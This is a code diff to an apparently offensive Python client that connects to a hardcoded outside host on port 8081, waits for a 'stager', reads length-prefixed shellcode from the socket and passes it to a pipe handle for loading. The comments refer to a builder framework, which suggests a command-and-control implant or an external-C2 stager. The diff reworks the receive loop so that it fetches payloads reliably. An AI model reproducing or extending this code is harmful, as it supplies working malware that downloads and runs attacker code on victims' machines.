@@ -18,7 +18,8 @@ HOST = "fuckd.at"
 PORT = "8081"
 
 # Timeout in seconds to wait for a new task
-SOCK_TIME_OUT = 5.0
+# SOCK_TIME_OUT = 5.0
+SOCK_TIME_OUT = None
 
 
 # THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
@@ -34,7 +35,7 @@ def decode(data):
 def prepTransport():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	print "Connecting to %s:%s" %(str(HOST),str(PORT))
-	connect = sock.connect((str(HOST),int(PORT)))
+	sock.connect((str(HOST),int(PORT)))
 	print "Connected!"
 	return sock
 
@@ -46,9 +47,16 @@ def sendData(sock, data):
 	return 0
 
 def recvData(sock):
-	data = "" # TODO
+	# Need to read the first 4 bytes of the frame to determine size
+	frameSize = ""
+	while len(frameSize) != 4:
+		frameSize = sock.recv(4)
+		print len(frameSize) # DEBUG
+
+	dataSize = struct.unpack('<I', frameSize)[0]
+	print "dataSize = " + str(dataSize) # DEBUG
 	# sock.settimeout(SOCK_TIME_OUT)
-	newTask = sock.recv(8126)
+	newTask = sock.recv(dataSize)
 	print "newTask = " + str(newTask) #DEBUG
 
 	decoded_task = decode(newTask)
@@ -88,12 +96,12 @@ def WritePipe(hPipe,chunk):
 def go(sock):
 	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
 	print "Waiting for stager..." # DEBUG
-	p=""
+	p = recvData(sock)
 	# Wait for shellcode
-	while(len(p) <= 0):
-		print "Next chunk.."
-		sleep(0.3)
-		p = recvData(sock)
+	# while(len(p) <= 0):
+	# 	print "Next chunk.."
+	# 	sleep(0.3)
+	# 	p = recvData(sock)
 	print "Got a stager! loading..."
 	sleep(2)
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
